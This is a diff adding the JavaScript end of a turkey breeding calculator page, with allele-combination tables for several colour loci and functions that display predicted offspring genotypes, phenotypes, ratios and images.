+break;
+case 'cgcg cc':
+case 'cc cgcg':
+combinations.push('cgc');
+ratios['cgc'] = 1;
+break;
+case 'cgcm cgcm':
+combinations.push('cgcg', 'cgcm', 'cmcm');
+ratios['cgcg'] = 0.25;
+ratios['cgcm'] = 0.5;
+ratios['cmcm'] = 0.25;
+break;
+case 'cgcm cgc':
+case 'cgc cgcm':
+combinations.push('cgcg', 'cgcm', 'cgc', 'cmc');
+ratios['cgcg'] = 0.25;
+ratios['cgcm'] = 0.25;
+ratios['cgc'] = 0.25;
+ratios['cmc'] = 0.25;
+break;
+case 'cgcm cmcm':
+case 'cmcm cgcm':
+combinations.push('cgcm', 'cmcm');
+ratios['cgcm'] = 0.5;
+ratios['cmcm'] = 0.5;
+break;
+case 'cgcm cmc':
+case 'cmc cgcm':
+combinations.push('cgcm', 'cgc', 'cmcm', 'cmc');
+ratios['cgcm'] = 0.25;
+ratios['cgc'] = 0.25;
+ratios['cmcm'] = 0.25;
+ratios['cmc'] = 0.25;
+break;
+case 'cgcm cc':
+case 'cc cgcm':
+combinations.push('cgc', 'cmc');
+ratios['cgc'] = 0.5;
+ratios['cmc'] = 0.5;
+break;
+case 'cgcg cgcg':
+combinations.push('cgcg');
+ratios['cgcg'] = 1;
+break;
+case 'cgc cgc':
+combinations.push('cgcg', 'cgc', 'cc');
+ratios['cgcg'] = 0.25;
+ratios['cgc'] = 0.5;
+ratios['cc'] = 0.25;
+break;
+case 'cgc cmcm':
+case 'cmcm cgc':
+combinations.push('cgcm', 'cmc');
+ratios['cgcm'] = 0.5;
+ratios['cmc'] = 0.5;
+break;
+case 'cgc cmc':
+case 'cmc cgc':
+combinations.push('cgcm', 'cgc', 'cmc', 'cc');
+ratios['cgcm'] = 0.25;
+ratios['cgc'] = 0.25;
+ratios['cmc'] = 0.25;
+ratios['cc'] = 0.25;
+break;
+case 'cgc cc':
+case 'cc cgc':
+combinations.push('cgc', 'cc');
+ratios['cgc'] = 0.5;
+ratios['cc'] = 0.5;
+break;
+case 'cmcm cmcm':
+combinations.push('cmcm');
+ratios['cmcm'] = 1;
+break;
+case 'cmcm cmc':
+case 'cmc cmcm':
+combinations.push('cmcm', 'cmc');
+ratios['cmcm'] = 0.5;
+ratios['cmc'] = 0.5;
+break;
+case 'cmcm cc':
+case 'cc cmcm':
+combinations.push('cmc');
+ratios['cmc'] = 1;
+break;
+case 'cmc cmc':
+combinations.push('cmcm', 'cmc', 'cc');
+ratios['cmcm'] = 0.25;
+ratios['cmc'] = 0.5;
+ratios['cc'] = 0.25;
+break;
+case 'cmc cc':
+case 'cc cmc':
+combinations.push('cmc', 'cc');
+ratios['cmc'] = 0.5;
+ratios['cc'] = 0.5;
+break;
+case 'cc cc':
+combinations.push('cc');
+ratios['cc'] = 1;
+break;
+default:
+if (alleleSire === alleleDam) {
+combinations.push(alleleSire);
+ratios[alleleSire] = 1;
+console.log('Matching alleles:', alleleSire);
+} else {
+combinations.push('To be defined');
+console.log('Undefined combination');
+}
+break;
+}
+break;
+case 'd':
+switch (alleles) {
+case 'DD DD':
+combinations.push('DD');
+ratios['DD'] = 1;
+break;
+case 'DD Dd':
+case 'Dd DD':
+combinations.push('DD', 'Dd');
+ratios['DD'] = 0.5;
+ratios['Dd'] = 0.5;
+break;
+case 'DD dd':
+case 'dd DD':
+combinations.push('Dd');
+ratios['Dd'] = 1;
+break;
+case 'Dd Dd':
+combinations.push('DD', 'Dd', 'dd');
+ratios['DD'] = 0.25;
+ratios['Dd'] = 0.5;
+ratios['dd'] = 0.25;
+break;
+case 'Dd dd':
+case 'dd Dd':
+combinations.push('Dd', 'dd');
+ratios['Dd'] = 0.5;
+ratios['dd'] = 0.5;
+break;
+case 'dd dd':
+combinations.push('dd');
+ratios['dd'] = 1;
+break;
+default:
+if (alleleSire === alleleDam) {
+combinations.push(alleleSire);
+ratios[alleleSire] = 1;
+console.log('Matching alleles:', alleleSire);
+} else {
+combinations.push('To be defined');
+console.log('Undefined combination');
+}
+break;
+}
+break;
+case 'E':
+// Handle combinations for locus E
+switch (alleles) {
+case 'EE E-':
+case 'E- EE':
+combinations.push('EE', 'E-');
+ratios['EE'] = 0.5;
+ratios['E-'] = 0.5;
+break;
+case 'EE e-':
+case 'e- EE':
+combinations.push('Ee', 'E-');
+ratios['Ee'] = 0.5;
+ratios['E-'] = 0.5;
+break;
+case 'Ee E-':
+case 'E- Ee':
+combinations.push('EE', 'Ee', 'E-', 'e-');
+ratios['EE'] = 0.25;
+ratios['Ee'] = 0.25;
+ratios['E-'] = 0.25;
+ratios['e-'] = 0.25;
+break;
+case 'Ee e-':
+case 'e- Ee':
+combinations.push('Ee', 'E-', 'ee', 'e-');
+ratios['Ee'] = 0.25;
+ratios['E-'] = 0.25;
+ratios['ee'] = 0.25;
+ratios['e-'] = 0.25;
+break;
+case 'ee E-':
+case 'E- ee':
+combinations.push('Ee', 'e-');
+ratios['Ee'] = 0.5;
+ratios['e-'] = 0.5;
+break;
+case 'ee e-':
+case 'e- ee':
+combinations.push('ee', 'e-');
+ratios['ee'] = 0.5;
+ratios['e-'] = 0.5;
+break;
+default:
+if (alleleSire === alleleDam) {
+combinations.push(alleleSire);
+ratios[alleleSire] = 1;
+console.log('Matching alleles:', alleleSire);
+} else {
+combinations.push('To be defined');
+console.log('Undefined combination');
+}
+break;
+}
+break;
+case 'N':
+// Handle combinations for locus N
+switch (alleles) {
+case 'NN N-':
+case 'N- NN':
+combinations.push('NN', 'N-');
+ratios['NN'] = 0.5;
+ratios['N-'] = 0.5;
+break;
+case 'NN n-':
+case 'n- NN':
+combinations.push('Nn', 'N-');
+ratios['Nn'] = 0.5;
+ratios['N-'] = 0.5;
+break;
+case 'Nn N-':
+case 'N- Nn':
+combinations.push('NN', 'Nn', 'N-', 'n-');
+ratios['NN'] = 0.25;
+ratios['Nn'] = 0.25;
+ratios['N-'] = 0.25;
+ratios['n-'] = 0.25;
+break;
+case 'Nn n-':
+case 'n- Nn':
+combinations.push('Nn', 'N-', 'nn', 'n-');
+ratios['Nn'] = 0.25;
+ratios['N-'] = 0.25;
+ratios['nn'] = 0.25;
+ratios['n-'] = 0.25;
+break;
+case 'nn N-':
+case 'N- nn':
+combinations.push('Nn', 'n-');
+ratios['Nn'] = 0.5;
+ratios['n-'] = 0.5;
+break;
+case 'nn n-':
+case 'n- nn':
+combinations.push('nn', 'n-');
+ratios['nn'] = 0.5;
+ratios['n-'] = 0.5;
+break;
+default:
+if (alleleSire === alleleDam) {
+combinations.push(alleleSire);
+ratios[alleleSire] = 1;
+console.log('Matching alleles:', alleleSire);
+} else {
+combinations.push('To be defined');
+console.log('Undefined combination');
+}
+break;
+}
+break;
+case 'Pn':
+// Handle combinations for locus Pn
+switch (alleles) {
+case 'PnPn PnPn':
+combinations.push('PnPn');
+ratios['PnPn'] = 1;
+break;
+case 'PnPn Pnpn':
+case 'Pnpn PnPn':
+combinations.push('PnPn', 'Pnpn');
+ratios['PnPn'] = 0.5;
+ratios['Pnpn'] = 0.5;
+break;
+case 'Pnpn Pnpn':
+combinations.push('PnPn', 'Pnpn', 'pnpn');
+ratios['PnPn'] = 0.25;
+ratios['Pnpn'] = 0.5;
+ratios['pnpn'] = 0.25;
+break;
+case 'pnpn pnpn':
+combinations.push('pnpn');
+ratios['pnpn'] = 1;
+break;
+case 'Pnpn pnpn':
+case 'pnpn Pnpn':
+combinations.push('Pnpn', 'pnpn');
+ratios['Pnpn'] = 0.5;
+ratios['pnpn'] = 0.5;
+break;
+case 'PnPn pnpn':
+combinations.push('Pnpn');
+ratios['Pnpn'] = 1;
+break;
+default:
+if (alleleSire === alleleDam) {
+combinations.push(alleleSire);
+ratios[alleleSire] = 1;
+console.log('Matching alleles:', alleleSire);
+} else {
+combinations.push('To be defined');
+console.log('Undefined combination');
+}
+break;
+}
+break;
+case 'R':
+// Handle combinations for locus R
+switch (alleles) {
+case 'RR RR':
+combinations.push('RR');
+ratios['RR'] = 1;
+break;
+case 'rr rr':
+combinations.push('rr');
+ratios['rr'] = 1;
+break;
+case 'RR rr':
+case 'rr RR':
+combinations.push('Rr');
+ratios['Rr'] = 1;
+break;
+case 'RR Rr':
+case 'Rr RR':
+combinations.push('RR', 'Rr');
+ratios['RR'] = 0.5;
+ratios['Rr'] = 0.5;
+break;
+case 'Rr Rr':
+combinations.push('RR', 'Rr', 'rr');
+ratios['RR'] = 0.25;
+ratios['Rr'] = 0.5;
+ratios['rr'] = 0.25;
+break;
+case 'rr Rr':
+case 'Rr rr':
+combinations.push('Rr', 'rr');
+ratios['Rr'] = 0.5;
+ratios['rr'] = 0.5;
+break;
+default:
+if (alleleSire === alleleDam) {
+combinations.push(alleleSire);
+ratios[alleleSire] = 1;
+console.log('Matching alleles:', alleleSire);
+} else {
+combinations.push('To be defined');
+console.log('Undefined combination');
+}
+break;
+}
+break;
+case 'Sl':
+// Handle combinations for locus Sl
+switch (alleles) {
+case 'SlSl SlSl':
+combinations.push('SlSl');
+ratios['SlSl'] = 1;
+break;
+case 'slsl slsl':
+combinations.push('slsl');
+ratios['slsl'] = 1;
+break;
+case 'SlSl slsl':
+case 'slsl SlSl':
+combinations.push('Slsl');
+ratios['Slsl'] = 1;
+break;
+case 'Slsl Slsl':
+combinations.push('SlSl', 'Slsl', 'slsl');
+ratios['SlSl'] = 0.25;
+ratios['Slsl'] = 0.5;
+ratios['slsl'] = 0.25;
+break;
+case 'SlSl Slsl':
+case 'Slsl SlSl':
+combinations.push('SlSl', 'Slsl');
+ratios['SlSl'] = 0.5;
+ratios['Slsl'] = 0.5;
+break;
+case 'Slsl slsl':
+case 'slsl Slsl':
+combinations.push('Slsl', 'slsl');
+ratios['Slsl'] = 0.5;
+ratios['slsl'] = 0.5;
+break;
+default:
+if (alleleSire === alleleDam) {
+combinations.push(alleleSire);
+ratios[alleleSire] = 1;
+console.log('Matching alleles:', alleleSire);
+} else {
+combinations.push('To be defined');
+console.log('Undefined combination');
+}
+break;
+}
+break;
+}
+
+return {
+combinations,
+ratios
+};
+}
+
+function setDefaultImages() {
+const defaultMalePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/';
+const defaultFemalePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/';
+
+document.getElementById('sireImageContainer').innerHTML = `<img src="${defaultMalePath}" alt="Default Sire Image" style="max-width: 300px; height: auto;">`;
+document.getElementById('damImageContainer').innerHTML = `<img src="${defaultFemalePath}" alt="Default Dam Image" style="max-width: 300px; height: auto;">`;
+}
+
+window.addEventListener('DOMContentLoaded', setDefaultImages);
+
+function removeUnusedAlleles(genotype) {
+const unusedAlleles = ['CC', 'dd', 'EE', 'E-', 'NN', 'N-', 'PnPn', 'RR', 'SlSl'];
+
+const alleles = genotype.split(' ');
+
+const filteredAlleles = alleles.filter(allele => !unusedAlleles.includes(allele));
+
+const shortGenotype = filteredAlleles.join(' ');
+
+return shortGenotype.trim(); // Trim to remove leading/trailing spaces
+}
+
+
+function displayResults(containerId, offspring, sex) {
+    const offspringList = document.getElementById(containerId);
+    offspringList.innerHTML = '';
+
+    offspring.forEach(offspringItem => {
+        const listItem = document.createElement('li');
+        listItem.className = 'offspring-item';
+
+        const genotype = removeUnusedAlleles(offspringItem.genotype);
+        const phenotype = offspringItem.phenotype || 'To be defined';
+        const basePicturePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/';
+        const adultPicturePath = basePicturePath + (sex === 'male' ? 'M' : 'F') + phenotype.replace(/\s/g, '') + '.jpg';
+
+        // Default poult image
+        let poultPicturePath = basePicturePath + 'P' + phenotype.replace(/\s/g, '') + '.jpg';
+
+         // Special conditions for poult image
+if (genotype.includes('cc') && !genotype.includes("Fdfd") && !genotype.includes("fdfd")) {
+            if (genotype.includes('BB') || genotype.includes('Bb') || genotype.includes('Bb1')) {
+                displayPhenotype = "White (Blue Eyes)";
+                imagePhenotype = "White";
+            } else if (genotype.includes('bb') || genotype.includes('bb1')) {
+                displayPhenotype = "White (Dark Brown Eyes)";
+                imagePhenotype = "White";
+            } else if (genotype.includes('b1b1')) {
+                displayPhenotype = "White (Light Brown Eyes)";
+                imagePhenotype = "White";
+            }
+        }
+
+        const fallbackImagePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/image-not-available.jpg'; // Replace with your actual fallback image URL
+
+        // Format the ratio to display with accurate precision
+        const ratio = (offspringItem.ratio * 100).toFixed(7).replace(/\.?0+$/, '');
+
+        listItem.innerHTML = `
+            <strong>${genotype}</strong><br>
+            <strong>${phenotype}</strong><br>
+            <strong>Ratio: ${ratio}%</strong><br>
+            <div class="image-container">
+                <div class="image-wrapper">
+                    <img src="${adultPicturePath}" alt="Adult ${sex} Image" style="width: 150px; height: 150px;" 
+                         onerror="this.onerror=null; this.src='${fallbackImagePath}';">
+                    <p>Adult</p>
+                </div>
+                <div class="image-wrapper">
+                    <img src="${poultPicturePath}" alt="Poult Image" style="width: 150px; height: 150px;" 
+                         onerror="this.onerror=null; this.src='${fallbackImagePath}';">
+                    <p>Poult</p>
+                </div>
+            </div>
+            <button onclick="transferOffspringToParent('${genotype}', '${sex === 'male' ? 'sire' : 'dam'}')" style="border: 4px solid blue; padding: 5px 10px;">Continue as ${sex === 'male' ? 'Sire' : 'Dam'}</button>
+        `;
+
+        offspringList.appendChild(listItem);
+    });
+}
+
+
+
+function setGenotypeImage(containerId, alleleb, alleleC, alleled, alleleE, alleleN, allelePn, alleleR, alleleSl, sex) {
+    const basePicturePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/';
+    const fallbackImagePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/image-not-available.jpg'; // Replace with your fallback image URL
+    const sexPrefix = sex === 'male' ? 'M' : 'F';
+
+    // Build genotype string
+    const genotype = `${alleleb} ${alleleC} ${alleled} ${alleleE} ${alleleN} ${allelePn} ${alleleR} ${alleleSl}`;
+    const shortGenotype = removeUnusedAlleles(genotype);
+
+    // Retrieve phenotype from all mappings
+    const phenotypeMappings = [phenotypeMapping1, phenotypeMapping1A, phenotypeMapping1B, phenotypeMapping1C, phenotypeMapping1D, phenotypeMapping1E, phenotypeMapping2, phenotypeMapping2A, phenotypeMapping3, phenotypeMapping3A, phenotypeMapping4, phenotypeMapping5, phenotypeMapping6, phenotypeMapping7, phenotypeMapping8, phenotypeMapping9, phenotypeMapping10, phenotypeMapping11, phenotypeMapping12, phenotypeMapping13, phenotypeMapping14, phenotypeMapping15];
+    let phenotype = null;
+
+    // Checks for cc in the genotype to force White phenotype
+if (genotype.includes('cc') && !(genotype.includes('Fdfd') || genotype.includes('fdfd'))) {
+    if (genotype.includes('BB') || genotype.includes('Bb') || genotype.includes('Bb1')) {
+        phenotype = "White (Blue Eyes)";
+    } else if (genotype.includes('bb') || genotype.includes('bb1')) {
+        phenotype = "White (Dark Brown Eyes)";
+    } else if (genotype.includes('b1b1')) {
+        phenotype = "White (Light Brown Eyes)";
+    } else {
+        phenotype = "White"; // Default fallback if none of the above match
+    }
+} else {
+    for (const mapping of phenotypeMappings) {
+        if (mapping.hasOwnProperty(shortGenotype)) {
+            phenotype = mapping[shortGenotype];
+            break;
+        }
+    }
+}
+
+    // Determine the image path or fallback
+    const picturePath = phenotype
+        ? `${basePicturePath}${sexPrefix}${phenotype.replace(/\s/g, '')}.jpg`
+        : fallbackImagePath;
+
+    // Generate the genotype information
+    const genotypeInfo = `
+        <strong>Genotype:</strong> ${shortGenotype}<br>
+        <strong>Phenotype:</strong> ${phenotype || 'To be defined'}
+    `;
+
+    // Update the container with the image and info
+    document.getElementById(containerId).innerHTML = `
+        <div>
+            <img src="${picturePath}" alt="${sex} Image" style="max-width: 460px; height: auto;" 
+                onerror="this.onerror=null; this.src='${fallbackImagePath}';">
+            <div>${genotypeInfo}</div>
+        </div>
+    `;
+}
+
+
+
+// Update the setDefaultImages function
+function setDefaultImages() {
+const defaultMalePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/MBronze.jpg';
+const defaultFemalePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/FBronze.jpg';
+
+document.getElementById('sireImageContainer').innerHTML = `<img src="${defaultMalePath}" alt="Default Sire Image" style="max-width: 460px; height: auto;">`;
+document.getElementById('damImageContainer').innerHTML = `<img src="${defaultFemalePath}" alt="Default Dam Image" style="max-width: 460px; height: auto;">`;
+}
+
+// Add event listeners for sire's alleles
+const sireAlleles = document.querySelectorAll('.sire-genotypes select');
+sireAlleles.forEach(select => {
+select.addEventListener('change', updateSireGenotype);
+});
+
+// Add event listeners for dam's alleles
+const damAlleles = document.querySelectorAll('.dam-genotypes select');
+damAlleles.forEach(select => {
+select.addEventListener('change', updateDamGenotype);
+});
+
+function updateSireGenotype() {
+const sireAlleleb = document.getElementById('sireAlleleb').value;
+const sireAlleleC = document.getElementById('sireAlleleC').value;
+const sireAlleled = document.getElementById('sireAlleled').value;
+const sireAlleleE = document.getElementById('sireAlleleE').value;
+const sireAlleleN = document.getElementById('sireAlleleN').value;
+const sireAllelePn = document.getElementById('sireAllelePn').value;
+const sireAlleleR = document.getElementById('sireAlleleR').value;
+const sireAlleleSl = document.getElementById('sireAlleleSl').value;
+
+console.log("Updated Sire Genotype: ", {sireAlleleb, sireAlleleC, sireAlleled, sireAlleleE, sireAlleleN, sireAllelePn, sireAlleleR, sireAlleleSl});
+
+setGenotypeImage('sireImageContainer', sireAlleleb, sireAlleleC, sireAlleled, sireAlleleE, sireAlleleN, sireAllelePn, sireAlleleR, sireAlleleSl, 'male');
+}
+
+function updateDamGenotype() {
+const damAlleleb = document.getElementById('damAlleleb').value;
+const damAlleleC = document.getElementById('damAlleleC').value;
+const damAlleled = document.getElementById('damAlleled').value;
+const damAlleleE = document.getElementById('damAlleleE').value;
+const damAlleleN = document.getElementById('damAlleleN').value;
+const damAllelePn = document.getElementById('damAllelePn').value;
+const damAlleleR = document.getElementById('damAlleleR').value;
+const damAlleleSl = document.getElementById('damAlleleSl').value;
+
+console.log("Updated Dam Genotype: ", {damAlleleb, damAlleleC, damAlleled, damAlleleE, damAlleleN, damAllelePn, damAlleleR, damAlleleSl});
+
+setGenotypeImage('damImageContainer', damAlleleb, damAlleleC, damAlleled, damAlleleE, damAlleleN, damAllelePn, damAlleleR, damAlleleSl, 'female');
+}
+
+
+
+
+window.addEventListener('DOMContentLoaded', function() {
+// Default genotype values
+const defaultValues = {
+sireAlleleb: 'bb',
+sireAlleleC: 'CC',
+sireAlleled: 'dd',
+sireAlleleE: 'EE',
+sireAlleleN: 'NN',
+sireAllelePn: 'PnPn',
+sireAlleleR: 'RR',
+sireAlleleSl: 'SlSl',
+damAlleleb: 'bb',
+damAlleleC: 'CC',
+damAlleled: 'dd',
+damAlleleE: 'E-',
+damAlleleN: 'N-',
+damAllelePn: 'PnPn',
+damAlleleR: 'RR',
+damAlleleSl: 'SlSl'
+};
+
+// Set default values to the dropdowns
+Object.keys(defaultValues).forEach(function(id) {
+document.getElementById(id).value = defaultValues[id];
+});
+
+// Call functions to update genotype and images
+updateSireGenotype();
+updateDamGenotype();
+});
+
+function updateImageSize(value) {
+const sireImage = document.getElementById('sireImageContainer').querySelector('img');
+const damImage = document.getElementById('damImageContainer').querySelector('img');
+
+sireImage.style.width = `${value}px`;
+damImage.style.width = `${value}px`;
+}
+
+
+
+
+function displaySummaryChart(maleOffspring, femaleOffspring) {
+const summaryTableBody = document.getElementById('summaryChart').querySelector('tbody');
+summaryTableBody.innerHTML = '';
+
+const addSummaryRow = (gender, genotype, phenotype, ratio) => {
+const row = document.createElement('tr');
+row.innerHTML = `
+<td>${gender}</td>
+<td>${genotype}</td>
+<td>${phenotype}</td>
+<td>${(ratio * 100).toFixed(3).replace(/\.?0+$/, '')}%</td>
+`;
+summaryTableBody.appendChild(row);
+};
+
+
+
+
+
+
+maleOffspring.forEach(offspring => {
+addSummaryRow('Male', removeUnusedAlleles(offspring.genotype), offspring.phenotype, offspring.ratio);
+});
+
+femaleOffspring.forEach(offspring => {
+addSummaryRow('Female', removeUnusedAlleles(offspring.genotype), offspring.phenotype, offspring.ratio);
+});
+}
+
+
+function transferOffspringToParent(genotype, parent) {
+const genotypeParts = genotype.split(' ');
+
+const alleleMapping = {
+B: parent === 'sire' ? 'sireAlleleb' : 'damAlleleb',
+b: parent === 'sire' ? 'sireAlleleb' : 'damAlleleb',
+C: parent === 'sire' ? 'sireAlleleC' : 'damAlleleC',
+cg: parent === 'sire' ? 'sireAlleleC' : 'damAlleleC',
+cm: parent === 'sire' ? 'sireAlleleC' : 'damAlleleC',
+c: parent === 'sire' ? 'sireAlleleC' : 'damAlleleC',
+D: parent === 'sire' ? 'sireAlleled' : 'damAlleled',
+d: parent === 'sire' ? 'sireAlleled' : 'damAlleled',
+E: parent === 'sire' ? 'sireAlleleE' : 'damAlleleE',
+e: parent === 'sire' ? 'sireAlleleE' : 'damAlleleE',
+N: parent === 'sire' ? 'sireAlleleN' : 'damAlleleN',
+n: parent === 'sire' ? 'sireAlleleN' : 'damAlleleN',
+Pn: parent === 'sire' ? 'sireAllelePn' : 'damAllelePn',
+pn: parent === 'sire' ? 'sireAllelePn' : 'damAllelePn',
+R: parent === 'sire' ? 'sireAlleleR' : 'damAlleleR',
+r: parent === 'sire' ? 'sireAlleleR' : 'damAlleleR',
+Sl: parent === 'sire' ? 'sireAlleleSl' : 'damAlleleSl',
+sl: parent === 'sire' ? 'sireAlleleSl' : 'damAlleleSl'
+};
+
+console.log("Transferring to " + parent);
+console.log("Genotype parts: ", genotypeParts);
+
+
+
+
+
+genotypeParts.forEach(part => {
+const key = Object.keys(alleleMapping).find(k => part.startsWith(k));
+if (key) {
+console.log("Mapping ", part, " to ", alleleMapping[key]);
+document.getElementById(alleleMapping[key]).value = part;
+} else {
+console.log("No mapping found for ", part);
+}
+});
+
+// Explicitly handle cg, cm, c, D, pn, r, sl to their defaults
+if (!genotype.includes('cg') && !genotype.includes('cm') && !genotype.includes('c') && parent === 'sire') {
+document.getElementById('sireAlleleC').value = 'CC';
+} else if (!genotype.includes('cg') && !genotype.includes('cm') && !genotype.includes('c') && parent === 'dam') {
+document.getElementById('damAlleleC').value = 'CC';
+}
+if (!genotype.includes('D') && parent === 'sire') {
+document.getElementById('sireAlleled').value = 'dd';
+} else if (!genotype.includes('D') && parent === 'dam') {
+document.getElementById('damAlleled').value = 'dd';
+}
+if (!genotype.includes('Pn') && !genotype.includes('pn') && parent === 'sire') {
+document.getElementById('sireAllelePn').value = 'PnPn';
+} else if (!genotype.includes('Pn') && !genotype.includes('pn') && parent === 'dam') {
+document.getElementById('damAllelePn').value = 'PnPn';
+}
+
+if (!genotype.includes('R') && !genotype.includes('r') && parent === 'sire') {
+document.getElementById('sireAlleleR').value = 'RR';
+} else if (!genotype.includes('R') && !genotype.includes('r') && parent === 'dam') {
+document.getElementById('damAlleleR').value = 'RR';
+}
+if (!genotype.includes('Sl') && !genotype.includes('sl') && parent === 'sire') {
+document.getElementById('sireAlleleSl').value = 'SlSl';
+} else if (!genotype.includes('Sl') && !genotype.includes('sl') && parent === 'dam') {
+document.getElementById('damAlleleSl').value = 'SlSl';
+}
+
+// Handle the E locus specifically
+if (parent === 'sire') {
+if (!genotype.includes('E') && !genotype.includes('e')) {
+document.getElementById('sireAlleleE').value = 'EE';
+} else if (genotype.includes('ee')) {
+document.getElementById('sireAlleleE').value = 'ee';
+} else {
+document.getElementById('sireAlleleE').value = 'Ee';
+}
+} else {
+if (!genotype.includes('E') && !genotype.includes('e') && !genotype.includes('e-')) {
+document.getElementById('damAlleleE').value = 'E-';
+} else if (genotype.includes('e-')) {
+document.getElementById('damAlleleE').value = 'e-';
+} else {
+document.getElementById('damAlleleE').value = 'E-';
+}
+}
+
+// Handle the N locus specifically
+if (parent === 'sire') {
+if (!genotype.includes('N') && !genotype.includes('n')) {
+document.getElementById('sireAlleleN').value = 'NN';
+} else if (genotype.includes('nn')) {
+document.getElementById('sireAlleleN').value = 'nn';
+} else {
+document.getElementById('sireAlleleN').value = 'Nn';
+}
+} else {
+if (!genotype.includes('N') && !genotype.includes('n') && !genotype.includes('n-')) {
+document.getElementById('damAlleleN').value = 'N-';
+} else if (genotype.includes('n-')) {
+document.getElementById('damAlleleN').value = 'n-';
+} else {
+document.getElementById('damAlleleN').value = 'N-';
+}
+}
+
+if (parent === 'sire') {
+updateSireGenotype();
+} else {
+updateDamGenotype();
+}
+
+
+// Show acknowledgment popup
+    showPopup(`The selected offspring has been transferred to the ${parent === 'sire' ? 'Sire' : 'Dam'} container for further calculations.`);
+}
+
+
+
+
+
+window.addEventListener('DOMContentLoaded', function() {
+resetCalculator();
+});
+
+
+function showPopup(message) {
+    const popup = document.getElementById('ackModal');
+    const messageContainer = document.getElementById('ackMessage');
+
+    // Set the message and show the popup
+    messageContainer.textContent = message;
+    popup.style.display = 'block';
+
+    // Hide the popup after 2 seconds
+    setTimeout(() => {
+        popup.style.display = 'none';
+    }, 2000);
+}
+
+
+
+</script>
+
+
+</body></html>
+
+
